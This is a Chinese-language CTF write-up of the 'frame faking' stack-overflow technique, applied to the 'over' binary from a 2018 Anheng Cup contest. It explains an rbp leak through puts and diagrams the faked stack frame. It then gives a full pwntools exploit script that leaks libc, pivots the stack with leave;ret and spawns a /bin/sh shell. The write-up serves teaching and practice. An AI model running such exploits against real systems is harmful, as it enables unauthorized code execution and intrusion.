---
title: 花式栈溢出- frame  faking
date: 2020-07-09 13:04:28
updated: 2020-07-09 13:04:28
tags:
    - 花式栈溢出
    - wiki
    - pwn
categories: 
	- 二进制安全
	- wiki-pwn
use:
  - Valine
text: true
lazyload: true
count: true
---
# 1.查看

2018 年 6 月安恒杯月赛的 over

![image.png](https://i.loli.net/2020/11/17/hOld42mSQTIW8eF.png)

# 2.ida分析

![image.png](https://i.loli.net/2020/11/17/VTDhwctHml1nyBO.png)

依旧是很小长度的栈溢出

刚好能溢出到返回地址（0x60-0x50）

由于 read 并不会给输入末尾补上 '\0', rbp 的值就会被 puts 打印出来, 这样我们就可以通过固定偏移知道栈上所有位置的地址了

![image.png](https://i.loli.net/2020/11/17/ug2TMPYi6RLjIlD.png)

```
ebp
|
v
ebp2|leave ret addr|arg1|arg2
fake ebp
|
v
ebp2|target function addr|leave ret addr|arg1|arg2
```



# 3.编写脚本

```python
#!/usr/bin/env python
#coding=utf-8
from pwn import *
#context.log_level = 'debug'
p=process('./over')
elf = ELF("./over")
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

my_u64 = lambda x: u64(x.ljust(8, '\0'))

puts_got=elf.got['puts']
puts_plt=elf.plt['puts']
leave_addr=0x4006be     #leave ; ret
pop_rdi=0x400793            #pop rdi ; ret

payload1='a'*0x50
p.recvuntil('>')
p.send(payload1)     
a=p.recvuntil('>',drop=True) 
ebp=my_u64(a[80:86])              
print 'ebp: '+hex(ebp)
stack=ebp-0x70          
#之所以 -0x70 是因为 rbp里面存的是 main的rbp
#stack=sub_400676_rbp-0x50=(main_rbp-0x20)-0x50
print 'stack: '+hex(stack)

payload2='a'*8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(0x400676)+'a'*40+p64(stack)+p64(leave_addr)
p.send(payload2)
b=p.recv()
puts=my_u64(b[12:-2])
print 'puts: '+hex(puts)

libcbase=puts-libc.symbols["puts"]
system=libc.symbols["system"]+libcbase
binsh=next(libc.search("/bin/sh"))+libcbase
print 'libcbase: '+hex(libcbase)
print 'system: '+hex(system)

payload3='a'*8+p64(pop_rdi)+p64(binsh)+p64(system)+p64(0x400676)+'a'*40+p64(stack-0x30)+p64(leave_addr)
#执行到这一步的时0x30=sub_400676_rbp-rsp（第一次影响了rsp，再次返回到main函数跟第一次的栈有区别）
p.send(payload3)

p.interactive()
```